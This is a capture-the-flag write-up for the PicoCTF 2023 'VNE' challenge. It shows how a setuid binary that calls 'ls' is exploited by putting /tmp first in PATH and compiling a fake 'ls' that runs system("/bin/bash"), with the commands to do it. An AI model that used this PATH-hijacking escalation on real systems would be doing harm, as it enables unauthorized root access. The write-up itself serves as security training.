# PicoCTF 2023 Binary Exploitation: VNE - 2Ô∏è0Ô∏è0Ô∏è points

## VNE Intro 

Scenario, tags, important info:

![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/e62e2ee3-088a-433d-8164-65e4a5640479)

Hint 1:

```
Have you checked the contents of the /root folder?
```

Hint 2:

```
Find a way to add more instruction to ls
```

In PicoCTF, taking hints are not harmful to your point count and thus should be treated just like normal information.

### Takeaways from hints, description, and tags: 
* Something important is in the /root file (the flag)
* We will have to use environment variables
* The binary lists contents of a directory as root
* We need to inject code into ‚Äúls‚Äù

## Phase 1: Recon 
It is important to get familiar with the machine we log into so that we can find important assets such as possible vulnerabilities, which we may be able to exploit to get us root access

### What do we notice? 
* A binary that lists a directory as root
* Why this is important: It does it as root via an SUID bit
* How it works: It takes the input for the directory as an environment variable
* Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary

```
ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp
ctf-player@pico-chall$ ls -l
ed
total 20
-rwsr-xr-x 1 root root 18752 Aug 4 2023 bin
ctf-player@pico-chall$
```


### What do we know based on the descriptions,  tags, and hints? ###
* Environment variables will be a key part of our exploitation strategy
* It is confirmed that the ls binary will have to be manipulated
* Flag is in the root directory
* One of the tags say injection, so we may be able to try environment variable injection

## Phase 2: Constructing a Plan 
Using the information we have gathered, we can try to assess vulnerabilities on our target system. So far, we have thought of environment variable injection, but now it is time for us to plot out this plan.

### The Plan: 
We make our own ls binary that spawns a shell. Since the file has an SUID, this will give us a root shell if the binary we are manipulating uses ls (in which according to the hints, it does).

There is however, a rather huge obstacle. How would we execute this plan so that the binary we are manipulating thinks our ls binary is the real ls binary?

We could exploit the PATH environment variable. And if you did not instantly come to this conclusion, you could have used Google.
![google](https://cdn.discordapp.com/attachments/803021452797411348/1087109722798309376/Screenshot_2023-03-19_122151.png)

But what directory should we put our binary into? The answer is /tmp. A directory with read, write, and execute permissions for everyone. This is perfect as it will be the perfect soil to plant our C code in.

### The Theory: 
Since we put /tmp before all the other directories, it should execute our ls binary instead of the real ls binary
![theory](https://cdn.discordapp.com/attachments/803021452797411348/1087110292078604378/image.png)

## Phase 3: Execution üßÄ
First, let's log onto our machine. To logon, we will need to use ssh with the command format of: 
`ssh -p <port> <user>@<ip>`
After logging on, let‚Äôs list our environment variables. 
![envlist](https://cdn.discordapp.com/attachments/803021452797411348/1087097188242432091/image.png)
Next, lets inject our /tmp directory into PATH
![inject](https://cdn.discordapp.com/attachments/803021452797411348/1087097080415268964/image.png)
Finally, we need to make our fake ls binary containing this C code:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  system("/bin/bash");
}
```

```
ctf-player@pico-chall$ touch ls.c
ctf-player@pico-chall$ echo "#include <stdio.h>" >> ls.c
ctf-player@pico-chall$ echo "#include <stdlib.h>" >> ls.c
ctf-player@pico-chall$ echo "int main()" >> ls.c
ctf-player@pico-chall$ echo "{" >> ls.c
ctf-player@pico-chall$ echo "   system(\"/bin/bash\");" >> ls.c
ctf-player@pico-chall$ echo "}" >> ls.c
ctf-player@pico-chall$ cc ls.c -o ls
```

Lets execute!

![flag](https://cdn.discordapp.com/attachments/803021452797411348/1087113134826864750/image.png)
